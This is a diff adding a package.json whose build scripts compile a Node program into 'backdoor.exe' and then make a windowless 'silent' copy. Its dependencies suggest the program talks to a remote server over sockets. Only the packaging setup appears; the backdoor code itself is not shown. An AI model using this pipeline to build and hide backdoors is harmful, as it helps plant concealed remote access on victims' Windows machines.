@@ -1,0 +1,21 @@
+{
+  "name": "js",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "dev": "nodemon index.js",
+    "build": "pkg index.js --output output/backdoor.exe --target node12-win-x64 && npm run silent",
+    "silent": "create-nodew-exe output/backdoor.exe output/backdoor.silent.exe",
+    "exe": "npm run build && \"./output/backdoor.exe\"",
+    "dev:manual": "nodemon --ignore *"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "request": "^2.88.2",
+    "request-promise": "^4.2.6",
+    "socket.io-client": "^4.2.0"
+  }
+}
